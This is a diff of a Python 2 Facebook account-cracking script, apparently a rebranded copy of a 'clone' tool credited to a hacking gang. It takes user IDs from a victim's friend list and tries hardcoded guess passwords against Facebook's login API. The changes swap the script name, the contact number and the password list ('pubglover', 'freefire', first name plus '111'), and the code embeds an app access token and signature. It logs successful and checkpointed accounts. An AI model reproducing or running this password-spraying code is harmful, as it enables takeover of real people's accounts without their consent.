@@ -13,7 +13,7 @@ try:
 except ImportError:
     os.system('pip2 install requests')
     os.system('pip2 install mechanize')
-    os.system('python2 jam.py')
+    os.system('python2 Chukhi.py')
 
 #Browser Setting
 reload(sys)
@@ -69,7 +69,7 @@ banner = """
 \033[1;91m➣ Github  : https://github.com/muskanckg
 \033[1;91m➣ GANG    : CRAZY KING GANG
 \033[1;91m➣ Youtube : JAM SHAHRUKH TECHNICAL
-\033[1;91m➣ WhatsApp: +923053176060
+\033[1;91m➣ WhatsApp: 03340002925
 \033[1;97m-----------------------------------------------"""
 # titik #
 def tik():
@@ -98,7 +98,7 @@ def menu():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 Chukhi.py')
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
@@ -109,11 +109,11 @@ def menu():
 		print"[!] Account Is On Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 Chukhi.py')
 	except requests.exceptions.ConnectionError:
 		print"[!] No Connection"
 		time.sleep(1)
-		('python2 jam.py')
+		('python2 Chukhi.py')
 	os.system("clear")
 	print banner
 	print "|[✓] Name: "+name
@@ -159,14 +159,14 @@ def men():
 		hamza('[✓] Tool Has Been Update Successfully')
 		hamza('[✓] Please Wait While Update Is Setting Up On Your Mobile Phone')
 		time.sleep(3)
-		os.hamza('python2 jam.py')
+		os.hamza('python2 Chukhi.py')
 	elif rana =="6":
 		os.system('xdg-open https://www.facebook.com/jam.shahrukh124')
 		menu()
 	elif rana =="7":
 		os.system('rm -rf login.txt')
 		hamza('[✓] Logged Out Successfully')
-		os.system('python2 jam.py')
+		os.system('python2 Chukhi.py')
 	else:
 		print "[!] Wrong Input"
 		men()
@@ -181,7 +181,7 @@ def crack():
 		print"Token invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 Chukhi.py')
 	os.system('clear')
 	print banner
 	print "[1] Clone From Friendlist."
@@ -260,7 +260,7 @@ def crack_menu():
 		try:
 			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
 			b = json.loads(a.text)
-			pass1='786786'
+			pass1='pubglover'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if "access_token" in q:
@@ -274,7 +274,7 @@ def crack_menu():
 					crt.close()
 					checkpoint.append(user+pass1)
 				else:
-					pass2 = 'Pakistan'
+					pass2 = 'freefire'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if "access_token" in q:
@@ -288,7 +288,7 @@ def crack_menu():
 							crt.close()
 							checkpoint.append(user+pass2)
 						else:
-							pass3 = '000786'
+							pass3 = 'freefirepakistan'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if "access_token" in q:
@@ -302,7 +302,7 @@ def crack_menu():
 									crt.close()
 									checkpoint.append(user+pass3)
 								else:
-									pass4 = b['first_name'] + '123'
+									pass4 = b['first_name'] + '111'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if "access_token" in q:
@@ -330,7 +330,7 @@ def crack_menu():
 													crt.close()
 													checkpoint.append(user+pass5)
 												else:
-													pass6 = b['first_name'] + '1122'
+													pass6 = b['first_name'] + '112233'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if "access_token" in q:
@@ -344,7 +344,7 @@ def crack_menu():
 															crt.close()
 															checkpoint.append(user+pass6)
 														else:
-															pass7 = b['first_name'] + '786'
+															pass7 = b['first_name'] + '@@@'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if "access_token" in q:
